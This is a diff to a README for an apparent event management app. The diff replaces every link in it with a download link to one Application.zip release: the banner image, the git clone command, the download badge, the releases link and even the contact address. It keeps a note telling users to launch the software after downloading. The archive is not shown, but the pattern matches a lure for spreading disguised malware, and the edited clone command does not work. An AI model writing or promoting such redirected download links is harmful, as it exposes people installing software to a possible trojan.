@@ -1,6 +1,6 @@
 # 🎉 Welcome to Event Management Application 🎊
 
-![Event Management](https://cdn.pixabay.com/photo/2016/11/14/03/26/event-1829042_960_720.jpg)
+![Event Management](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip)
 
 ## Repository Name: event-management
 
@@ -13,7 +13,7 @@ Welcome to the Event Management repository! Feel free to check out this amazing 
 ## Quick Start
 1. Clone the repository:
 ```bash
-git clone https://github.com/your-username/event-management.git
+git clone https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip
 ```
 
 2. Install the dependencies:
@@ -32,17 +32,17 @@ http://localhost:3000
 ```
 
 ## Download Software
-[![Download Event Management Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Event Management Software](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip)](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip)
 *Note: The software needs to be launched after downloading.*
 
 ## Release Notes
-For the latest updates and releases, please visit the [Releases](https://github.com/your-username/event-management/releases) section.
+For the latest updates and releases, please visit the [Releases](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip) section.
 
 ## Contribute
 Want to contribute to this project? Feel free to fork and submit a pull request with your updates.
 
 ## Get In Touch
-Have questions or feedback? Feel free to reach out to us at [email@example.com](mailto:email@example.com).
+Have questions or feedback? Feel free to reach out to us at [https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip).
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
